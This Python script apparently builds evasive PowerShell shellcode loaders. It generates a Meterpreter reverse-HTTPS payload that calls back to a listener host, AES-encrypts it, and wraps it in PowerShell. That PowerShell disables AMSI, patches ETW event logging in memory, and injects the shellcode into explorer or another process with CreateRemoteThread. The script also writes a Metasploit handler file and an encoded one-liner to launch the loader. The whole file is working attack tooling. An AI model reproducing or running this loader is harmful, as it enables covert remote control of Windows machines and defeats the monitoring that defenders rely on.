#!/usr/bin/env python3

import argparse
import base64
import random
import string
import subprocess
import sys
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
except ImportError:
    print("[-] Missing pycryptodome. Install: pip install pycryptodome")
    sys.exit(1)


ARCH_DEFAULTS = {
    "x64": "windows/x64/meterpreter/reverse_https",
    "x86": "windows/meterpreter/reverse_https",
}


def run_msfvenom(lhost: str, lport: int, payload: str) -> bytes:
    cmd = [
        "msfvenom", "-p", payload,
        f"LHOST={lhost}", f"LPORT={lport}",
        "EXITFUNC=thread", "-f", "raw",
    ]
    print(f"[+] Running: {' '.join(cmd)}", file=sys.stderr)
    try:
        res = subprocess.run(cmd, capture_output=True, check=True)
    except FileNotFoundError:
        sys.exit("[-] msfvenom not found in PATH")
    except subprocess.CalledProcessError as e:
        sys.exit(f"[-] msfvenom failed:\n{e.stderr.decode(errors='replace')}")
    sc = res.stdout
    print(f"[+] Generated {len(sc)} bytes of shellcode", file=sys.stderr)
    return sc


def encrypt_aes256_cbc(shellcode: bytes) -> tuple:
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))
    print(f"[+] Original size:  {len(shellcode)} bytes", file=sys.stderr)
    print(f"[+] Encrypted size: {len(ciphertext)} bytes", file=sys.stderr)
    return (
        base64.b64encode(ciphertext).decode(),
        base64.b64encode(key).decode(),
        base64.b64encode(iv).decode(),
    )


def detect_arch(payload: str) -> str:
    return "x64" if "x64" in payload else "x86"


def rand_name(length: int = 10) -> str:
    first = random.choice(string.ascii_uppercase)
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


def generate_handler_rc(payload: str, lhost: str, lport: int, output_path: str):
    rc = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set EXITFUNC thread
set ExitOnSession false
exploit -j
"""
    Path(output_path).write_text(rc)
    print(f"[+] Handler resource file: {output_path}", file=sys.stderr)
    print(f"[+] Start handler: msfconsole -q -r {output_path}", file=sys.stderr)


# ---------------------------------------------------------------------------
# PowerShell template sections
# Markers (FNLOOKUP, FNDELEGATE, etc.) are replaced by the builder.
# Uses raw strings to preserve PowerShell backslashes and braces.
# ---------------------------------------------------------------------------

PS_AMSI = r"""try{
$r=[Ref].Assembly
$t=$r.GetType(('System.Management.Automation.'+'Am'+'si'+'U'+'tils'))
$f=$t.GetField(('am'+'si'+'In'+'it'+'Fa'+'iled'),'NonPublic,Static')
$f.SetValue($null,$true)
}catch{}
"""

PS_HELPERS = r"""function FNLOOKUP {
    Param($m, $f)
    $u = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $h = $u.GetMethod('GetModuleHandle').Invoke($null, @($m))
    $u.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $h)), $f))
}
function FNDELEGATE {
    Param([Parameter(Position=0, Mandatory=$True)] [Type[]] $func, [Parameter(Position=1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ASMNAME')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('MODNAME', $false).DefineType('TYPENAME', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName,HideBySig,Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $delType, $func).SetImplementationFlags('Runtime,Managed')
    return $type.CreateType()
}
"""

PS_ETW_X64 = r"""try{
$etwA = FNLOOKUP "ntdll.dll" "EtwEventWrite"
$vpA = FNLOOKUP "kernel32.dll" "VirtualProtect"
$vpD = FNDELEGATE @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$vpF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpD)
[uint32]$etwOp = 0
$vpF.Invoke($etwA, [uint32]1, 0x40, [ref]$etwOp) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etwA, 0xC3)
$vpF.Invoke($etwA, [uint32]1, $etwOp, [ref]$etwOp) | Out-Null
}catch{}
"""

PS_ETW_X86 = r"""try{
$etwA = FNLOOKUP "ntdll.dll" "EtwEventWrite"
$vpA = FNLOOKUP "kernel32.dll" "VirtualProtect"
$vpD = FNDELEGATE @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$vpF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpD)
[uint32]$etwOp = 0
$vpF.Invoke($etwA, [uint32]3, 0x40, [ref]$etwOp) | Out-Null
$etwPatch = [byte[]]@(0xC2, 0x10, 0x00)
[System.Runtime.InteropServices.Marshal]::Copy($etwPatch, 0, $etwA, 3)
$vpF.Invoke($etwA, [uint32]3, $etwOp, [ref]$etwOp) | Out-Null
}catch{}
"""

PS_DECRYPT = r"""$enc=[Convert]::FromBase64String("ENCB64")
$key=[Convert]::FromBase64String("KEYB64")
$iv=[Convert]::FromBase64String("IVB64")
$aes=[System.Security.Cryptography.Aes]::Create()
$aes.Key=$key;$aes.IV=$iv
$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
$aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$d=$aes.CreateDecryptor()
$ms=New-Object System.IO.MemoryStream(,$enc)
$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$d,[System.Security.Cryptography.CryptoStreamMode]::Read)
$rs=New-Object System.IO.MemoryStream
$cs.CopyTo($rs)
$sc=$rs.ToArray()
$ms.Dispose();$cs.Dispose();$rs.Dispose();$aes.Dispose()
$len=$sc.Length
"""

PS_INJECT_REMOTE = r"""$proc = Get-Process -Name "TARGETPROC" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) { exit }
$opA = FNLOOKUP "kernel32.dll" "OpenProcess"
$opD = FNDELEGATE @([UInt32], [Bool], [UInt32]) ([IntPtr])
$opF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($opA, $opD)
$hP = $opF.Invoke(0x001F0FFF, $false, [uint32]$proc.Id)
if ($hP -eq [IntPtr]::Zero) { exit }
$vaA = FNLOOKUP "kernel32.dll" "VirtualAllocEx"
$vaD = FNDELEGATE @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$vaF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaA, $vaD)
$rA = $vaF.Invoke($hP, [IntPtr]::Zero, [uint32]$len, 0x3000, 0x04)
if ($rA -eq [IntPtr]::Zero) { exit }
$wpmA = FNLOOKUP "kernel32.dll" "WriteProcessMemory"
$wpmD = FNDELEGATE @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$wpmF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wpmA, $wpmD)
[uint32]$bw = 0
$wpmF.Invoke($hP, $rA, $sc, [uint32]$len, [ref]$bw) | Out-Null
[Array]::Clear($sc, 0, $len)
[Array]::Clear($key, 0, $key.Length)
[Array]::Clear($iv, 0, $iv.Length)
$vpxA = FNLOOKUP "kernel32.dll" "VirtualProtectEx"
$vpxD = FNDELEGATE @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$vpxF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpxA, $vpxD)
[uint32]$oP = 0
$vpxF.Invoke($hP, $rA, [uint32]$len, 0x20, [ref]$oP) | Out-Null
$crtA = FNLOOKUP "kernel32.dll" "CreateRemoteThread"
$crtD = FNDELEGATE @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$crtF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($crtA, $crtD)
$crtF.Invoke($hP, [IntPtr]::Zero, 0, $rA, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
"""

PS_INJECT_SELF = r"""$vaA = FNLOOKUP "kernel32.dll" "VirtualAlloc"
$vaD = FNDELEGATE @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$vaF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaA, $vaD)
$addr = $vaF.Invoke([IntPtr]::Zero, [uint32]$len, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $len)
[Array]::Clear($sc, 0, $len)
[Array]::Clear($key, 0, $key.Length)
[Array]::Clear($iv, 0, $iv.Length)
$vpA = FNLOOKUP "kernel32.dll" "VirtualProtect"
$vpD = FNDELEGATE @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$vpF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpD)
[uint32]$oP = 0
$vpF.Invoke($addr, [uint32]$len, 0x20, [ref]$oP) | Out-Null
$ctA = FNLOOKUP "kernel32.dll" "CreateThread"
$ctD = FNDELEGATE @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$ctF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctA, $ctD)
$hT = $ctF.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$wfA = FNLOOKUP "kernel32.dll" "WaitForSingleObject"
$wfD = FNDELEGATE @([IntPtr], [UInt32]) ([UInt32])
$wfF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfA, $wfD)
$wfF.Invoke($hT, 0xFFFFFFFF) | Out-Null
"""


def build_ps(enc_b64: str, key_b64: str, iv_b64: str,
             arch: str, target: str, self_inject: bool,
             amsi: bool = True, etw: bool = True) -> str:
    fn_lookup = rand_name()
    fn_delegate = rand_name()
    asm_name = rand_name()
    mod_name = rand_name()
    type_name = rand_name()

    parts = []
    if amsi:
        parts.append(PS_AMSI)
    parts.append(PS_HELPERS)
    if etw:
        parts.append(PS_ETW_X64 if arch == "x64" else PS_ETW_X86)
    parts.append(PS_DECRYPT)
    parts.append(PS_INJECT_SELF if self_inject else PS_INJECT_REMOTE)

    ps = ''.join(parts)

    replacements = [
        ('FNLOOKUP', fn_lookup),
        ('FNDELEGATE', fn_delegate),
        ('ASMNAME', asm_name),
        ('MODNAME', mod_name),
        ('TYPENAME', type_name),
        ('TARGETPROC', target),
        ('ENCB64', enc_b64),
        ('KEYB64', key_b64),
        ('IVB64', iv_b64),
    ]
    for marker, value in replacements:
        ps = ps.replace(marker, value)

    return ps


def main():
    ap = argparse.ArgumentParser(
        description="Build PowerShell shellcode loader (reflection-based, no files on disk)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Remote injection into explorer.exe (default):
    python3 build_powershell.py --lhost 192.168.x.x

  Self-injection (CreateThread in current process):
    python3 build_powershell.py --lhost 192.168.x.x --self

  Inject into specific process:
    python3 build_powershell.py --lhost 192.168.x.x --target svchost

  With handler and base64 one-liner:
    python3 build_powershell.py --lhost 192.168.x.x --handler --enc

  x86 payload:
    python3 build_powershell.py --lhost 192.168.x.x \
        --payload windows/meterpreter/reverse_https
        """,
    )
    ap.add_argument("--lhost", default=None, help="Listener IP (required unless --shellcode)")
    ap.add_argument("--lport", type=int, default=443, help="Listener port (default 443)")
    ap.add_argument("--payload", default=None,
                    help="Override msfvenom payload (default: meterpreter/reverse_https x64)")
    ap.add_argument("--shellcode", default=None,
                    help="Path to raw shellcode file (skip msfvenom)")
    ap.add_argument("-o", "--output", default="loader.ps1", help="Output .ps1 path")
    ap.add_argument("--target", default="explorer",
                    help="Target process for remote injection (default: explorer)")
    ap.add_argument("--self", action="store_true",
                    help="Self-injection instead of remote process injection")
    ap.add_argument("--no-amsi", action="store_true", help="Disable AMSI bypass")
    ap.add_argument("--no-etw", action="store_true", help="Disable ETW bypass")
    ap.add_argument("--no-handler", action="store_true",
                    help="Do not generate Metasploit handler .rc file")
    ap.add_argument("--enc", action="store_true",
                    help="Output base64-encoded one-liner for powershell -enc")
    args = ap.parse_args()

    if args.shellcode is None and args.lhost is None:
        ap.error("--lhost is required when not using --shellcode")

    payload = args.payload or ARCH_DEFAULTS["x64"]
    arch = detect_arch(payload)

    mode = "self-injection" if args.self else f"remote injection -> {args.target}.exe"
    print(f"[+] Payload:     {payload}", file=sys.stderr)
    print(f"[+] Arch:        {arch}", file=sys.stderr)
    print(f"[+] Mode:        {mode}", file=sys.stderr)
    print(f"[+] AMSI bypass: {'yes' if not args.no_amsi else 'no'}", file=sys.stderr)
    print(f"[+] ETW bypass:  {'yes' if not args.no_etw else 'no'}", file=sys.stderr)
    print(f"[+] Memory:      RW -> RX", file=sys.stderr)
    print(f"[+] P/Invoke:    reflection (no Add-Type, no files on disk)", file=sys.stderr)

    if args.shellcode:
        sc = Path(args.shellcode).read_bytes()
        print(f"[+] Loaded {len(sc)} bytes from {args.shellcode}", file=sys.stderr)
    else:
        sc = run_msfvenom(args.lhost, args.lport, payload)
    enc_b64, key_b64, iv_b64 = encrypt_aes256_cbc(sc)

    ps = build_ps(enc_b64, key_b64, iv_b64,
                  arch=arch,
                  target=args.target,
                  self_inject=getattr(args, 'self'),
                  amsi=not args.no_amsi,
                  etw=not args.no_etw)

    Path(args.output).write_text(ps)
    print(f"[+] Wrote {args.output} ({len(ps)} chars)", file=sys.stderr)
    print(f"[+] Run: powershell -ep bypass -f {args.output}", file=sys.stderr)

    if arch == "x86":
        print("[!] x86 payload: use 32-bit PowerShell:", file=sys.stderr)
        print("    C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe "
              f"-ep bypass -f {args.output}", file=sys.stderr)

    if args.enc:
        encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
        print(f"\n[+] Base64 one-liner:", file=sys.stderr)
        print(f"powershell -ep bypass -enc {encoded}", file=sys.stderr)

    if not args.no_handler and args.shellcode is None:
        rc_path = Path(args.output).stem + "_handler.rc"
        generate_handler_rc(payload, args.lhost, args.lport, rc_path)


if __name__ == "__main__":
    main()
